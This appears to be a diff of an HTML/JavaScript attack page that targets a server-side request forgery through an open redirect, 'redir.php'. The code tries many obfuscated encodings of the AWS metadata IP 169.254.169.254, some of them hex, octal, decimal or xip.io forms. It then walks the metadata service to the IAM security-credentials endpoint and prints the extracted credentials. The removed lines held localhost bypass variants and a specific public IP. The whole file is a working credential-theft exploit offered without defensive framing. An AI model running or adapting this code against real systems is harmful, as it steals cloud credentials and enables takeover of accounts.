@@ -1,79 +1,88 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>IP Bypass Attack</title>
+    <title>AWS Metadata IP Bypass</title>
 </head>
 <body>
-    <h1>🎯 IP Address Bypass Attack</h1>
+    <h1>☁️ AWS Metadata Service IP Bypass</h1>
     <div id="results"></div>
     
     <script>
         var results = "";
         
-        // Alternative IP representations to bypass localhost filtering
-        var ipVariations = [
-            // Standard localhost representations
-            '127.0.0.1',
-            '127.1',
-            '127.000.000.001', 
-            '0.0.0.0',
+        // Alternative representations of 169.254.169.254 (AWS metadata IP)
+        var metadataIPs = [
+            // Standard
+            '169.254.169.254',
             
-            // Hex representations
-            '0x7f000001',      // 127.0.0.1 in hex
-            '0x7f.0x0.0x0.0x1',
+            // Hex representations of 169.254.169.254
+            '0xa9.0xfe.0xa9.0xfe',
+            '0xa9fea9fe',           // Full hex
             
-            // Octal representations  
-            '0177.0.0.1',      // 127 in octal
-            '017700000001',    // Full octal
+            // Octal representations
+            '0251.0376.0251.0376',   // Full octal
             
-            // Decimal representation
-            '2130706433',      // 127.0.0.1 as decimal
+            // Decimal representation  
+            '2852039166',            // 169.254.169.254 as decimal
             
-            // IPv6 localhost
-            '[::1]',
-            '[0:0:0:0:0:0:0:1]',
+            // Mixed representations
+            '169.254.169.0xfe',      // Mixed decimal/hex
+            '169.0376.169.254',      // Mixed decimal/octal
             
-            // Alternative localhost formats
-            'localhost.localdomain',
-            '127.0.0.1.xip.io',
-            '127.0.0.1.nip.io',
+            // Alternative formats
+            '169.254.169.254.xip.io',
+            '169.254.169.254.nip.io',
             
-            // Internal hostname possibilities
-            'ip-172-31-',      // Common AWS internal naming
-            'localhost',       // Try again to confirm
+            // URL encoding bypass attempts
+            'http%3A%2F%2F169.254.169.254',
             
-            // Try the actual server IP internally
-            '54.209.100.76'
+            // Try if it responds to different hostnames
+            'metadata',
+            'metadata.amazonaws.com',
+            'instance-data',
+            'ec2metadata'
         ];
         
-        for(var i = 0; i < ipVariations.length; i++) {
+        for(var i = 0; i < metadataIPs.length; i++) {
             try {
-                results += "<h3>🔍 Testing: " + ipVariations[i] + "</h3>";
+                results += "<h3>🔍 Testing AWS Metadata: " + metadataIPs[i] + "</h3>";
                 
-                // Test basic connection first
+                // Test metadata root
                 var xhr1 = new XMLHttpRequest();
-                xhr1.open('GET', 'http://localhost/redir.php?url=http://' + ipVariations[i] + '/', false);
+                xhr1.open('GET', 'http://localhost/redir.php?url=http://' + metadataIPs[i] + '/latest/meta-data/', false);
                 xhr1.send();
                 
-                if(xhr1.responseText && xhr1.responseText.length > 5) {
-                    results += "<div style='background:#e8f5e8;padding:10px;border:2px solid green;'>🎯 BREAKTHROUGH: " + ipVariations[i] + " works! (" + xhr1.responseText.length + " bytes)</div>";
-                    results += "<div style='background:#f0f0f0;padding:10px;max-height:100px;overflow:scroll;font-size:10px;'>" + xhr1.responseText.substring(0, 300) + "</div>";
+                if(xhr1.responseText && xhr1.responseText.trim().length > 0) {
+                    results += "<div style='background:#e8f5e8;padding:10px;border:2px solid green;'>🎯 METADATA ACCESS: " + metadataIPs[i] + " (" + xhr1.responseText.length + " bytes)</div>";
+                    results += "<div style='background:#f0f0f0;padding:10px;font-size:11px;'>" + xhr1.responseText + "</div>";
                     
-                    // If basic connection works, try accessing redir.php on that IP
+                    // If metadata root works, try IAM credentials immediately
                     try {
                         var xhr2 = new XMLHttpRequest();
-                        xhr2.open('GET', 'http://localhost/redir.php?url=http://' + ipVariations[i] + '/redir.php?url=https://www.google.com', false);
+                        xhr2.open('GET', 'http://localhost/redir.php?url=http://' + metadataIPs[i] + '/latest/meta-data/iam/security-credentials/', false);
                         xhr2.send();
-                        results += "<div style='background:#ffff99;padding:5px;'>🔄 Nested redir test: " + xhr2.responseText.length + " bytes</div>";
+                        
+                        if(xhr2.responseText && xhr2.responseText.trim().length > 0) {
+                            results += "<div style='background:#74c0fc;padding:8px;'>🔑 IAM ROLE FOUND: " + xhr2.responseText + "</div>";
+                            
+                            // Get the actual credentials
+                            var roleName = xhr2.responseText.trim();
+                            var xhr3 = new XMLHttpRequest();
+                            xhr3.open('GET', 'http://localhost/redir.php?url=http://' + metadataIPs[i] + '/latest/meta-data/iam/security-credentials/' + roleName, false);
+                            xhr3.send();
+                            
+                            results += "<div style='background:#ff6b6b;color:white;padding:10px;border:3px solid red;'>🚨 AWS CREDENTIALS EXTRACTED! 🚨</div>";
+                            results += "<div style='background:#f0f0f0;padding:10px;font-size:10px;white-space:pre-wrap;word-wrap:break-word;'>" + xhr3.responseText + "</div>";
+                        }
                     } catch(e2) {
-                        results += "<div style='background:#ffeaa7;padding:3px;'>⚠️ Nested failed: " + e2.message.substring(0, 50) + "</div>";
+                        results += "<div style='background:#ffeaa7;padding:3px;'>⚠️ IAM access failed</div>";
                     }
                     
                 } else {
-                    results += "<div style='background:#ffe8e8;padding:3px;'>❌ No response</div>";
+                    results += "<div style='background:#ffe8e8;padding:3px;'>❌ No metadata response</div>";
                 }
             } catch(e) {
-                results += "<div style='background:#ffe8e8;padding:3px;'>❌ " + e.message.substring(0, 50) + "</div>";
+                results += "<div style='background:#ffe8e8;padding:3px;'>❌ Failed: " + e.message.substring(0, 50) + "</div>";
             }
         }
         
